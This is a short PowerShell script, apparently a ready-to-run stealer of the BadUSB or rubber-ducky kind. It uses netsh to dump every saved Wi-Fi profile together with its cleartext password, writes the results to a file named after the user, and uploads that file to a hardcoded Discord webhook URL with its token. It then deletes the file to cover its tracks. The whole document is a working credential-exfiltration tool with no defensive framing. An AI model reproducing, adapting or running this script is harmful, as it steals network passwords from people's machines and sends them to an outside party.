$n = "$env:UserName.txt"
$w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'

(netsh wlan show profiles) |
  Select-String ':(.+)$' |
  % {
    $p = $_.Matches.Groups[1].Value.Trim()
    (netsh wlan show profile name="$p" key=clear) |
      Select-String 'Key Content.+:(.+)$' |
      % {
        $k = $_.Matches.Groups[1].Value.Trim()
        [PSCustomObject]@{PROFILE_NAME = $p; PASSWORD = $k}
      }
  } | Out-File $n

$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$headers = @{
  "Content-Type" = "multipart/form-data; boundary=$boundary"
}

$fileContent = Get-Content $n -Raw
$bodyLines = @(
  "--$boundary",
  'Content-Disposition: form-data; name="file"; filename="' + $n + '"',
  'Content-Type: text/plain',
  '',
  $fileContent,
  "--$boundary--"
) -join $LF

$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)

Invoke-RestMethod -Uri $w -Method POST -Headers $headers -Body $bodyBytes

Remove-Item $n -Force
